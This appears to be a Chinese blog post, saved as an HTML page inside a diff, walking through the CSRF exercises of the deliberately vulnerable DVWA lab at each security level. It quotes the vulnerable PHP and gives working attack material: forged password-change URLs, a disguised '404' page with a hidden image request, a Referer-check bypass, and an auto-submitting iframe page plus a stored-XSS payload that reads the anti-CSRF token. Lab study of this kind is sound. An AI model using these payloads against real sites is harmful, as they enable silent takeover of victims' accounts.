@@ -1,0 +1,399 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DVWA之CSRF | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DVWA之CSRF | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="什么是CSRF:
+​ CSRF跨站请求伪造(Cross Site Request Forgery)，黑客诱导用户点击带有伪造请求(修改密码，转账，删除文章等高风险操作请求)链接后，利用未失效的用户认证信息，产生服务器验证请求通过，导致用户在..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DVWA之CSRF
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-03-31
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>什么是CSRF:</p>
+<p>​ CSRF跨站请求伪造(Cross Site Request Forgery)，黑客诱导用户点击带有伪造请求(修改密码，转账，删除文章等高风险操作请求)链接后，利用未失效的用户认证信息，产生服务器验证请求通过，导致用户在不知情的情况下进行了转账等操作。</p>
+<p>与XSS的区别：</p>
+<p>​ XSS是通过修改页面JavaScript等代码后，发给用户从而实现盗取cookie信息，之后利用cookie进行登陆网站等操作。非法操作是黑客。利用的是用户对指定网站的信任。</p>
+<p>​ CSRF并没有盗取cookie信息，而是通过用户直接利用cookie进行操作。非法操作的并不是黑客，而是利用客户本身。CSRF攻击的重点在于更改状态的请求，而不是盗取数据，因为攻击者无法查看伪造请求响应。利用网站对用户网页浏览器的信任。</p>
+<p>同源策略：</p>
+<p>​ 含义：A网页设置的cookie，B网页不能打开，除非这两个网页”同源”，同源指(三个相同)：</p>
+<p>协议相同<br>
+域名相同<br>
+端口相同<br>
+举例说明：</p>
+<p>http://www.example.com/dir/page.html 这个网址，协议是http://，域名是www.example.com，端口是80(默认)。它的同源情况：<br>
+http://www.example.com/dir/otherpage.html （同源）<br>
+http://example.com/dir/page.html(不同源，域名不同)<br>
+https://www.example.com/dir/page.html(不同源，协议不同)<br>
+同源策略的目的：</p>
+<p>​ 为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
+<p>同源限制范围：</p>
+<p>​ cookie、LocalStorage（本地存储）、indexDB无法读取，Dom无法获得，AJAX请求不能发送。</p>
+<p>CSRF跨站请求伪造：</p>
+<p>1.原理总结<br>
+一个CSRF漏洞攻击的实现，由三部分构成：</p>
+<p>有一个漏洞存在（无需验证、任意修改后台数据、新增请求）<br>
+伪造数据操作请求的恶意连接或者页面<br>
+诱使用户主动的访问恶意连接<br>
+2.漏洞存在<br>
+关键字：跨站请求漏洞</p>
+<p>​ 如果需要CSRF攻击能够成功，首先就需要目标站点或者系统存在一个可以进行数据修改和新增的操作，且此操作被提交到后台的过程中，其为提供任何身份验证或身份校验的参数。后台只要收到请求，就立即下发数据修改或新增的操作。</p>
+<p>​ 此漏洞出现较多的场景用户密码修改、购物地址的修改、后台管理账户操作过程中。</p>
+<p>3.漏洞利用的伪装<br>
+关键字：伪装请求</p>
+<p>​ CSRF漏洞存在了，如果真正的利用，还需要对修改或新增数据操作请求的伪装，此时恶意攻击者只要将伪装好”数据修改或新增”的请求发送给被攻击者，或者通过社工的方式诱使被攻击者在其cookie还生效的情况下点击了此请求连接，即可触发CSRF漏洞，成功修改或新增当前用户的数据信息，如修改当前用户密码，或触发漏洞新增一个后台管理员。<br>
+CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
+<pre><code>                                       1.Low
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617197878724.png" alt="" loading="lazy"><br>
+分析：<br>
+服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。</p>
+<p>Exploit</p>
+<p>1.构造如下链接：</p>
+<pre><code>http://127.0.0.1/vulnerabilities/csrf/password_new=test&amp;password_conf=test&amp;Change=Change#
+</code></pre>
+<p>当受害者点击了这个链接，密码就会被改成test<br>
+2.使用短链接来隐藏 URL：<br>
+为了更加隐蔽，可以生成短网址链接，点击短链接，会自动跳转到真实网站：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617197935586.jpg" alt="" loading="lazy"><br>
+但是修改密码后还是会出现密码修改的痕迹。</p>
+<p>构建一个页面，诱导用户去点击<br>
+<html><br>
+<head><br>
+<meta charset="utf-8"><br>
+<title>404 Not Found</title><br>
+</head><br>
+<body><br>
+<img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#" border="0" style="display:none;"/><br>
+<center><br>
+<h1>404 Not Found</h1><br>
+<center><br>
+</body><br>
+</html><br>
+当用户点击后，会误认为这是个错误的页面，而不在意，但是密码已经被修改为123。</p>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617198060840.png" alt="" loading="lazy"><br>
+<strong>2.medium</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+// Checks to see where the request came from
+if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
+// Get input
+$pass_new  = $_GET[ 'password_new' ];
+$pass_conf = $_GET[ 'password_conf' ];
+
+// Do the passwords match?
+if( $pass_new == $pass_conf ) {
+// They do!
+$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+$pass_new = md5( $pass_new );
+
+// Update the database
+$insert = &quot;UPDATE `users` SET password = '$pass_new' WHERE user = '&quot; . dvwaCurrentUser() . &quot;';&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+// Feedback for the user
+echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+}
+else {
+// Issue with passwords matching
+echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+}
+}
+else {
+// Didn't come from a trusted source
+echo &quot;&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;&quot;;
+}
+
+((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt; 
+</code></pre>
+<p>medium类型的代码在low级别上，加上了对用户请求头的Referer字段进行验证。</p>
+<pre><code>if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
+</code></pre>
+<p>即用户的请求头中的Referer字段必须包含服务器的名字。<br>
+我们可以将攻击页面名修改为127.0.0.1.html(改为包含主机名)进行绕过。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617198259426.png" alt="" loading="lazy"></p>
+<p>因为增加了对Referer头的检测，所以我们直接访问之前的链接是无法成功的。</p>
+<pre><code>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617198316932.png" alt="" loading="lazy"><br>
+我们可以用burp抓包，自己增加一个Referer头：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617198362648.png" alt="" loading="lazy"><br>
+成功修改。<br>
+<strong>3.high</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+// Check Anti-CSRF token
+checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+// Get input
+$pass_new  = $_GET[ 'password_new' ];
+$pass_conf = $_GET[ 'password_conf' ];
+
+// Do the passwords match?
+if( $pass_new == $pass_conf ) {
+// They do!
+$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+$pass_new = md5( $pass_new );
+
+// Update the database
+$insert = &quot;UPDATE `users` SET password = '$pass_new' WHERE user = '&quot; . dvwaCurrentUser() . &quot;';&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+// Feedback for the user
+echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+}
+else {
+// Issue with passwords matching
+echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+}
+
+((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt; 
+</code></pre>
+<p>high级别代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检测token，只有token正确，才会处理客户端的请求。</p>
+<p>攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见的框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密码的请求，以完成CSRF攻击。<br>
+<!DOCTYPE html><br>
+<html><br>
+<head lang="en"><br>
+<meta charset="utf-8"><br>
+<title><title><br>
+<script type="text/javascript"><br>
+//获取用户的token，并设置为表单中的token，然后提交修改密码的表单<br>
+function attack()<br>
+{<br>
+document.getElementsByName('user_token')[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName('user_token')[0].value;<br>
+document.getElementById(&quot;transfer&quot;).submit();<br>
+}<br>
+</script><br>
+</head><br>
+<body onload="attack()"><br>
+<iframe src="http://127.0.0.1/dvwa/vulnerabilities/csrf/" id="hack" style="display:none;"> <!--在该网页内打开另一个网页--><br>
+</iframe><br>
+<form method="GET" id="transfer" action="http://127.0.0.1/dvwa/vulnerabilities/csrf/"><br>
+<input type="hidden" name="password_new" value="admin"><br>
+<input type="hidden" name="password_conf" value="admin"><br>
+<input type="hidden" name="user_token" value=""><br>
+<input type="hidden" name="Change" value="Change"><br>
+</form><br>
+</body><br>
+</html><br>
+但是还有一个问题，同源策略，由于我们框架iframe要访问的链接是http://192.168.216.129/dvwa/vulnerabilities/csrf/，这是漏洞网站服务器的链接。而我们的脚本执行的位置是我们自己搭建的一个服务器，所以我们的攻击脚本是不可能跨取到改密界面的user_token。</p>
+<p>在这里，我们想要获取用户的token，并提交修改密码的表单的话，就必须得把我们的攻击脚本注入到目标服务器中。而想要注入到目标服务器，同时得发挥作用，获取用户的token修改密码的话，就要和XSS漏洞一起结合实现。</p>
+<p>将下列代码通过存储型XSS插入到数据库中，这语句会弹出用户的token：</p>
+<pre><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName('user_token')[0].value)&gt;&lt;/iframe&gt;
+
+    **4.impossible**
+
+&lt;?php
+
+if( isset( $_GET[ 'Change' ] ) ) {
+// Check Anti-CSRF token
+checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+// Get input
+$pass_curr = $_GET[ 'password_current' ];
+$pass_new  = $_GET[ 'password_new' ];
+$pass_conf = $_GET[ 'password_conf' ];
+
+// Sanitise current password input
+$pass_curr = stripslashes( $pass_curr );
+$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+$pass_curr = md5( $pass_curr );
+
+// Check that the current password is correct
+$data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+$data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+$data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );
+$data-&gt;execute();
+
+// Do both new passwords match and does the current password match the user?
+if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+// It does!
+$pass_new = stripslashes( $pass_new );
+$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+$pass_new = md5( $pass_new );
+
+// Update database with new password
+$data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
+$data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );
+$data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
+$data-&gt;execute();
+
+// Feedback for the user
+echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+}
+else {
+// Issue with passwords matching
+echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;
+}
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt; 
+</code></pre>
+<p>impossible级别代码在防护CSRF中，需要知道原始密码，而我们并不知道，所以无法进行CSRF攻击。</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/dvwa-zhi-fileinclusion/">
+              <h3 class="post-title">
+                DVWA之FileInclusion
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
